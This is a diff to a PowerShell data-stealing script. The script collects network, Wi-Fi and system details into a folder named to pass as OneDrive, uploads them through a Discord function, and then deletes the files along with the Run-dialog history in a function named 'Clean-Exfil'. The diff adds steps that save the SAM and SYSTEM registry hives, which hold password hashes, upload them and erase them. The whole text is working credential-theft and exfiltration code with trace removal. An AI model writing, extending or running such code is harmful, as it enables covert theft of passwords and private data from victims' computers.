@@ -1,3 +1,5 @@
+
+cd $env:SystemRoot\System32\Microsoft_OneDrive\BQ
 Function Get-Networks {
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress
 $WLANProfileNames =@()
@@ -29,6 +31,8 @@ arp -a | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\arp.t
 systeminfo | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\systeminfo.txt
 getmac /v | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\mac.txt
 netstat -aon | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\netstat.txt
+reg save HKLM\sam ./sam.save
+reg save HKLM\system ./system.save
 
 
 
@@ -61,6 +65,8 @@ Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\arp.txt
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\systeminfo.txt
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\mac.txt
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\netstat.txt
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\WIFI-INFO.txt" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt" -r -Force -ErrorAction SilentlyContinue
@@ -68,6 +74,10 @@ rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\arp.txt" -r -Force -ErrorActi
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\systeminfo.txt" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\mac.txt" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\netstat.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save" -r -Force -ErrorAction SilentlyContinue
+rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save" -r -Force -ErrorAction SilentlyContinue
+
+
 function Clean-Exfil { 
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
